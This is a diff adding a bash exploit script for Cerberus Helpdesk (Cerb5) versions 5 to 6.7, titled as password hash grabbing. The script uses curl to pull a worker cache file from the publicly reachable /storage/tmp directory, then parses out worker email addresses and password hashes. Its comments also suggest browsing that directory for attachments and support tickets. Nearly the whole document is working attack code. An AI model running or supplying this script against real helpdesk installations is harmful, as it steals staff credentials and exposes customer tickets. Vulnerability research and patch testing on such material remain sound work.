@@ -1,0 +1,38 @@
+#!/bin/bash
+#####################################################################################
+# Exploit Title: Cerberus Helpdesk (Cerb5) Password Hash Grabbing                   #
+# Date: 04.02.2016                                                                  #
+# Exploit Author: asdizzle_                                                         #
+# Vendor Homepage: http://www.cerberusweb.com/                                      #
+# Software Link: http://www.cerberusweb.com/downloads/cerb5/archive/cerb5-5_4_4.zip #
+# Version: 5 - 6.7                                                                  #
+# Tested on: Debian 8 / apache2 with cerb 5                                         #
+#####################################################################################
+# Prerequisites:                                                                    #
+#		-At least one worker must be logged in                              #
+#		-/storage/tmp/ dir must be accessible                               #
+#                                                                                   #
+# If everything else fails try if there's directory listing in /storage/tmp         #
+# You might find attachments and even support tickets.                              #
+#####################################################################################
+
+url='http://172.16.15.137/cerb5/5.4.4' # Full url (without /index.php/ !)
+pre='devblocks' # If this doesn't work try 'zend'
+
+echo "[*] Trying to fetch cache file"
+
+cachechk=$(curl -s $url"/storage/tmp/"$pre"_cache---ch_workers" | grep pass)
+if [ -z "$cachechk" ];then
+	echo "[-] File not found."
+	exit
+else
+	echo "[+] Found. Extracting..."
+	hashes=$(echo "$cachechk" | sed -e 's/s:5/\n/g' | grep email | cut -d '"' -f4,8 | sed 's/"/:/g')
+	if [ -z "$hashes" ];then
+		echo "[-] Hash extracting failed"
+	else
+		echo "[+] Extracting seems to have worked"
+		echo
+		echo "$hashes"
+	fi
+fi
